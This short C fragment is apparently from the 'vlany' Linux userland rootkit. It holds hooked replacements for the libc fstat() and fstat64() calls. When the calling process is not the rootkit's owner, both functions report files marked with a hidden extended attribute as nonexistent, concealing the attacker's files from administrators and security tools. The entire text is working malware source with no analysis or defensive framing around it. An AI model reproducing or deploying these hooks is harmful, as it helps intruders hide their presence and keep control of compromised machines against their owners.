int fstat(int fd, struct stat *buf)
{
    #ifdef DEBUG
        printf("[vlany] fstat() called\n");
    #endif

    HOOK(old_fxstat, C__FXSTAT);

    if(owned()) return old_fxstat(_STAT_VER, fd, buf);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fxstat(_STAT_VER, fd, buf);
}

int fstat64(int fd, struct stat64 *buf)
{
    #ifdef DEBUG
        printf("[vlany] fstat64() called\n");
    #endif

    HOOK(old_fxstat64, C__FXSTAT64);

    if(owned()) return old_fxstat64(_STAT_VER, fd, buf);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fxstat64(_STAT_VER, fd, buf);
}
